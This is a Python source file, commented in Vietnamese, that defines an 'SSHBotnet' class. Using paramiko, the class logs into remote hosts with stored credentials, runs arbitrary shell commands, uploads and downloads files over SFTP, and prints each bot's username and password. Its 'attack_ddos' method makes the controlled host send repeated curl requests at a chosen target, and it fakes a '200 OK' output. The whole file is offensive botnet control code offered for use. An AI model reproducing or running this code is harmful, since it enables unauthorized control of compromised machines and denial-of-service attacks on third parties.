import os
import stat
import paramiko
import datetime


class SSHBotnet:  # class ssh botnet
    def __init__(self, hostname, username, password):
        self.__hostname = hostname  # thuộc tính hostname
        self.__username = username  # thuộc tính username
        self.__password = password  # thuộc tính password
        self.__ssh = paramiko.SSHClient()  # tạo nối SSH đến máy chủ
        # xác minh khóa lạ mặc định được thiết lập cho đối tượng SSHClient
        self.__ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # kết nối đến máy chủ
        self.__ssh.connect(self.__hostname, username=self.__username, password=self.__password)
        # mở một phiên kết nối SFTP
        # sfpt là một đối tượng thuộc lớp paramiko.SFTPClient,
        # được sử dụng để tương tác với các tập tin trên máy chủ thông qua
        # giao thức SFTP (Secure File Transfer Protocol).
        self.__sfpt = self.__ssh.open_sftp()
        # lấy đường dẫn hin tại của thư mục sfpt
        self.__current_dir = self.__sfpt.normalize('.')
        # normalize('.') khi tham số truyền vào là '.', nó đại diện cho thư mục hiện tại.
        # Phương thức normalize() sẽ chuẩn hóa đường dẫn này thành đường dẫn tuyệt đối của
        # thư mục hiện tại trên máy chủ SFTP, và trả về giá trị đó.

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.__sfpt.close()  # đóng sfpt
        self.__ssh.close()  # đóng ssh

    def format_permissions(self, permissions):  # phương thức định dạng quyền
        # permissions: là một số nguyên, biểu thị quyền truy cập của tệp hoặc thư mục trong hệ thống tập tin.
        # modes: là một danh sách các chuỗi biểu thị cho tất cả các quyền truy cập có thể có của tệp hoặc thư mục.
        modes = ["---", "--x", "-w-", "-wx", "r--", "r-x", "rw-", "rwx"]
        # octal_modes: là một danh sách các số nguyên biểu thị cho các quyền truy cập của tệp hoặc thư mục
        # ở hệ thập phân sau đó được chuyển đổi sang hệ cơ số 8.
        octal_modes = [int(x) for x in str(oct(permissions)[-3:])]
        # [-3:] lấy một phần của chuỗi bắt đầu từ ký tự thứ 3 tính từ cuối chuỗi đến hết chuỗi.
        # Khi áp dụng với oct(permissions), nó sẽ trả về một chuỗi bao
        # gồm các ký tự được biểu diễn dưới hệ bát phân của giá trị permissions
        return "".join([modes[i] for i in octal_modes])
        # join() của string để nối các phần tử của list kết quả ở bước trên thành một string duy nhất.

    def format_date(self, timestamp):
        # phương thức sử dụng fromtimestamp() để chuyển đổi giá trị timestamp
        # thành một đối tượng datetime.datetime, đại diện cho ngày và giờ
        date = datetime.datetime.fromtimestamp(timestamp)
        # strftime() để định dạng đối tượng datetime thành một chuỗi có định dạng như sau: 'mm/dd/yyyy hh:mm AM/PM'.
        return date.strftime('%m/%d/%Y %I:%M %p')

    def list_dir(self):
        try:
            print("{:<26} {:<10} {:<12} {:<6} {}".format("Last Modified", "Type", "Size", "Perm", "Name"))
            print("-" * 70)
            # lấy danh sách các tệp tin và thư mục hiện có trong thư mục hiện tại trên máy chủ SFTP
            # Kết quả trả về là một danh sách các đối tượng SFTPAttributes,
            # mỗi đối tượng biểu diễn thông tin về một tệp tin hoặc thư mục trong thư mục hiện tại.
            file_list = self.__sfpt.listdir_attr(self.__current_dir)  # duyệt đối tượng 1
            for file in file_list:
                permissions = self.format_permissions(file.st_mode)  # định dạng hiển thị quyền
                size = file.st_size  # lấy kích thước
                # stat.S_ISDIR() là một hàm trong module stat của Python,
                # được sử dụng để kiểm tra xem một đường dẫn được chỉ định có phải là một thư mục hay không
                if stat.S_ISDIR(file.st_mode):  # nếu nó là thư mục
                    type = "<DIR>"  # loại dir
                    size = ""  # kich thuoc chưa xác định
                else:
                    type = ""  # file
                name = file.filename  # lấy tên file
                modified = self.format_date(file.st_mtime)  # thời gian
                print("{:<26} {:<10} {:<12} {:<6} {}".format(modified, type, size, permissions, name))  # hiển thị
        except IOError as e:
            print(f"Error: {e}")  # ngoại lệ thì thông báo

    def cd_new_dir(self, command):
        try:
            dir_name = command.split()[1]  # lấy tên thư mục
            # đường dẫn tuyệt đối thư mục muốn cd
            new_dir = self.__sfpt.normalize(self.__current_dir + '/' + dir_name)
            self.__sfpt.chdir(new_dir)  # thay đổi thư mục hiện tại của sfpt đến thư mục mới
            self.__current_dir = self.__sfpt.normalize('.')  # cập nhật đường dẫn tuyệt đối của thư mục hiện tại
        except Exception:
            pass

    def execute_command(self, command):
        try:
            if command.startswith("more "):
                filename = command.split()[1]
                try:
                    with self.__sfpt.open(filename) as f:
                        output = f.read().decode()
                        print(output)
                except IOError as e:
                    print(f"Error: {e}")
            else:
                stdin, stdout, stderr = self.__ssh.exec_command(command)  # thực thi lệnh
                output = stdout.read().decode()  # stdout là nguồn đầu ra chuẩn
                error = stderr.read().decode()
                print(output)
                print(error)
        except Exception:
            print('Command invalid ! Please try again ....!')

    def download_file(self, command):
        # tải xuống một tệp từ máy chủ từ xa đến máy tính hiện tại của người dùng
        try:
            hostname = command.split(" ")[2]  # lấy tên ip
            if hostname == self.__hostname:  # kiểm tra ip có = nhau k
                filename = self.get_file_name(command)  # lấy tên file cần tải
                remote_file_path = f"{self.__current_dir}/{filename}"  # lây đường dẫn tuyệt đối của file cần tải
                local_file_path = f"./{filename}"  # đường dẫn tệp đích máy người dùng
                self.__sfpt.get(remote_file_path, local_file_path)
                # Hàm get là một phương thức của đối tượng sftp trong thư viện paramiko cho phép
                # thực hiện các thao tác truyền tải file giữa máy chủ và máy khách.
                print(f"Downloaded {filename} success !")
        except IOError:
            print('Command invalid ! Please try again ....!')

    def upload_file(self, local_file_path):
        # đầu vào là đường dẫn đến tệp cục bộ (local_file_path).
        try:
            filename = os.path.basename(local_file_path)  # trích xuất tên tệp
            remote_file_path = f"{self.__current_dir}/{filename}"  # đường dẫn đến tệp máy chủ
            self.__sfpt.put(local_file_path, remote_file_path)  # để tải tệp lên
            print(f"Uploaded {filename} success !")
        except IOError:
            print('Command invalid ! Please try again ....!')

    def excute(self, command):  # Thực thi lệnh
        try:
            if command.startswith('cd '):  # nếu cd có xuất hiện đầu trong lệnh
                self.cd_new_dir(command)  # thực hiện di chuyển thưc mục
                print(f'Current directory  {self.__current_dir} ')
                print()
            elif command == 'cd':  # nếu == cd thì hiển thị đường dẫn thư mục hiện tại
                print(f'Current directory  {self.__current_dir} ')
                print()
            elif command == 'dir':  # lệnh là dir thì hiển thị danh sách của thư mục hiện tại
                self.list_dir()
                print()
            elif command.startswith('download'):  # lệnh có chứa đầu là download
                self.download_file(command)
                print()
            elif command.startswith('upload'):  # tải file
                self.upload_file(self.get_file_name(command))
                print()
            elif command == 'clear':  # xóa file
                self.clear_terminal()
                print()
            elif command.startswith('ddos'):  # tấn công ddos
                self.attack_ddos(command)
                print()
            else:
                self.execute_command(command)  # thực thi lệnh
                print()
            print()
        except:
            pass

    def clear_terminal(self):
        # Kiểm tra hệ điều hành
        if os.name == 'nt':  # Nếu là Windows
            os.system('cls')  # Dùng lệnh cls để xóa màn hình
        else:  # Nếu là Unix (Linux, MacOS, ...)
            os.system('clear')  # Dùng lệnh clear để xóa màn hình

    def get_file_name(self, command):  # lấy tên file
        return command.split()[1]

    def show_infor(self):  # hiển thị thông tin
        print(f'\t\t[{self.__hostname},{self.__username},{self.__password}]')

    def attack_ddos(self, command):  # taanc công ddos
        try:
            target = command.split(' ')[1]
            url = f'https://{target}'  # mục tiêu
            command = f'curl -I {url}'
            for i in range(1, 11):  # gửi yêu cầu 10 lần
                stdin, stdout, stderr = self.__ssh.exec_command(command)  # thực thi lệnh
                output = stdout.read().decode()  # đọc kết quả
                output = f'\t\t{self.__hostname},{self.__username},{self.__password} ddos {target} :{i} ' \
                         f'>> HTTP/1.1 200 OK'
                print(output)
        except:
            pass
